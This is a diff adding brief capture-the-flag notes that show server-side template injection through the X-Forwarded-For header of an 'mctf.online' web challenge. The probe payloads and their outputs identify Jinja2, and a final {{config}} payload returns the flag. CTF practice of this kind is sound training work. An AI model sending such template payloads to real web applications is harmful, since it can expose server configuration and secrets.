@@ -1,0 +1,17 @@
+GET /index HTTP/1.1
+Host: web-library.mctf.online
+X-Forwarded-For: ab
+X-Forwarded-For: 123
+	Here it is:  123
+
+X-Forwarded-For: {{7*7}}
+	Here it is:  49
+
+X-Forwarded-For: {{7*'7'}}
+	Here it is:  7777777
+
+=> jinja2
+
+X-Forwarded-For: ab
+X-Forwarded-For: {{config}}
+	MCTF{IS_IT_NOT_SO_SECURE_?}
